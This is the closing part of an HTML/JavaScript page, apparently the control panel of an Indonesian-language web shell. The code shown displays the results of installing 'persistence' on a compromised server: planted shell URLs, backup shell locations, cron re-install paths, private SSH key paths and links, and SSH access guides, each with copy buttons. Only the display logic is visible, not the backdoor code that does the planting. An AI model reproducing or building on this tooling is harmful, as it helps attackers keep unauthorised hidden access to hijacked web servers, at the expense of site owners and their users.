                    html += '<h4 style="color:' + borderColor + ';margin:0 0 8px 0;">' + icon + ' ' + method.toUpperCase() + '</h4>';
                    
                    if (info.description) {
                        html += '<p style="color:#888;margin:5px 0;font-size:11px;">📋 ' + info.description + '</p>';
                    }
                    
                    if (info.path) {
                        html += '<p style="color:#6cf;margin:5px 0;font-size:11px;">📁 <strong>Path:</strong> ' + info.path + '</p>';
                    }
                    
                    if (info.locations && info.locations.length > 0) {
                        html += '<p style="color:#6cf;margin:5px 0;font-size:11px;">📁 <strong>Backup Locations:</strong></p>';
                        html += '<ul style="margin:5px 0;color:#6cf;font-size:11px;">';
                        info.locations.forEach(loc => {
                            html += '<li>' + loc + '</li>';
                        });
                        html += '</ul>';
                    }
                    
                    if (info.access_urls && info.access_urls.length > 0) {
                        html += '<p style="color:#0f0;margin:5px 0;font-size:11px;">🔗 <strong>Akses via Browser:</strong></p>';
                        html += '<ul style="margin:5px 0;">';
                        info.access_urls.forEach(url => {
                            html += '<li style="margin:3px 0;"><a href="' + url + '" target="_blank" style="color:#0f0;font-size:11px;word-break:break-all;">' + url + '</a></li>';
                        });
                        html += '</ul>';
                    }
                    
                    if (info.access_url) {
                        html += '<p style="color:#0f0;margin:5px 0;font-size:11px;">🔗 <strong>URL:</strong> <a href="' + info.access_url + '" target="_blank" style="color:#0f0;word-break:break-all;">' + info.access_url + '</a></p>';
                    }
                    
                    if (info.how_to_use) {
                        html += '<div style="background:#000;padding:8px;margin:8px 0;border-left:3px solid #ff0;">';
                        html += '<p style="color:#ff0;margin:0;font-size:11px;">💡 <strong>CARA PAKAI:</strong></p>';
                        html += '<p style="color:#ccc;margin:5px 0 0 0;font-size:11px;">' + info.how_to_use + '</p>';
                        html += '</div>';
                    }
                    
                    // Tampilkan system backups untuk cron
                    if (info.system_backups && info.system_backups.length > 0) {
                        html += '<p style="color:#f80;margin:5px 0;font-size:11px;">🔒 <strong>System Backup Paths (untuk Cron):</strong></p>';
                        html += '<ul style="margin:5px 0;color:#f80;font-size:11px;">';
                        info.system_backups.forEach(bak => {
                            html += '<li>' + bak.path + '</li>';
                        });
                        html += '</ul>';
                    }
                    
                    if (info.manual_cmd) {
                        html += '<p style="color:#888;margin:5px 0;font-size:11px;">⌨️ <strong>Check:</strong> <code style="background:#000;padding:2px 5px;">' + info.manual_cmd + '</code></p>';
                    }
                    
                    if (info.private_key_path) {
                        html += '<p style="color:#f80;margin:5px 0;font-size:11px;">🔑 <strong>Private Key:</strong> ' + info.private_key_path + '</p>';
                    }
                    
                    if (info.access_example) {
                        html += '<p style="color:#888;margin:5px 0;font-size:11px;">📝 <strong>Example:</strong> ' + info.access_example + '</p>';
                    }
                    
                    if (info.private_key_url) {
                        html += '<p style="color:#0f0;margin:5px 0;font-size:11px;">🔑 <strong>Private Key:</strong> <a href="' + info.private_key_url + '" target="_blank" style="color:#0f0;word-break:break-all;">' + info.private_key_url + '</a></p>';
                    }
                    
                    if (info.note) {
                        html += '<p style="color:#888;margin:5px 0;font-size:11px;">📝 <strong>Note:</strong> ' + info.note + '</p>';
                    }
                    
                    if (info.method) {
                        html += '<p style="color:#888;margin:5px 0;font-size:11px;">⚙️ <strong>Method:</strong> ' + info.method + '</p>';
                    }
                    
                    html += '</div>';
                }
                
                html += '<div style="background:#2a0000;border:1px solid #f44;padding:15px;margin-top:15px;">';
                html += '<p style="color:#f44;margin:0;font-size:12px;">⚠️ <strong>PERINGATAN:</strong> ' + (data.warning || 'Simpan informasi ini dengan aman!') + '</p>';
                html += '</div>';
                
                // REKAP SEMUA URL SHELL
                if (data.all_urls && data.all_urls.length > 0) {
                    const urlsText = data.all_urls.join('\n');
                    html += '<div style="margin-top:20px;">';
                    html += '<h4 style="color:#0f0;margin:0 0 10px 0;">📋 SEMUA URL SHELL (Copy & Simpan!)</h4>';
                    html += '<textarea id="urlsTextarea" readonly style="width:100%;height:120px;background:#000;color:#0f0;border:1px solid #0f0;padding:10px;font-family:monospace;font-size:11px;resize:vertical;">' + urlsText + '</textarea>';
                    html += '<button onclick="copyToClipboard(\'urlsTextarea\')" style="margin-top:5px;background:#0f0;color:#000;padding:5px 15px;border:none;cursor:pointer;font-weight:bold;">📋 Copy URL</button>';
                    html += '</div>';
                }
                
                // DOKUMENTASI LENGKAP
                if (data.documentation_content) {
                    html += '<div style="margin-top:20px;">';
                    html += '<h4 style="color:#6cf;margin:0 0 10px 0;">📖 DOKUMENTASI LENGKAP (Copy & Simpan!)</h4>';
                    html += '<textarea id="docTextarea" readonly style="width:100%;height:200px;background:#000;color:#6cf;border:1px solid #6cf;padding:10px;font-family:monospace;font-size:11px;resize:vertical;">' + data.documentation_content + '</textarea>';
                    html += '<button onclick="copyToClipboard(\'docTextarea\')" style="margin-top:5px;background:#6cf;color:#000;padding:5px 15px;border:none;cursor:pointer;font-weight:bold;">📋 Copy Dokumentasi</button>';
                    html += '</div>';
                }
                
                // SSH DOKUMENTASI
                if (data.ssh_documentation) {
                    html += '<div style="margin-top:20px;">';
                    html += '<h4 style="color:#f80;margin:0 0 10px 0;">🔐 PANDUAN AKSES SSH (Copy & Simpan!)</h4>';
                    html += '<textarea id="sshTextarea" readonly style="width:100%;height:150px;background:#000;color:#f80;border:1px solid #f80;padding:10px;font-family:monospace;font-size:11px;resize:vertical;">' + data.ssh_documentation + '</textarea>';
                    html += '<button onclick="copyToClipboard(\'sshTextarea\')" style="margin-top:5px;background:#f80;color:#000;padding:5px 15px;border:none;cursor:pointer;font-weight:bold;">📋 Copy SSH Guide</button>';
                    html += '</div>';
                }
                
                outputDiv.innerHTML = html;
            } else {
                outputDiv.innerHTML = '<span style="color:#f44;">❌ Failed to install persistence: ' + (data.error || 'Unknown error') + '</span>';
            }
        })
        .catch(error => {
            outputDiv.innerHTML = '<span style="color:#f44;">❌ Error: ' + escapeHtml(error.message) + '</span>';
        });
}
</script>
</body>
</html>
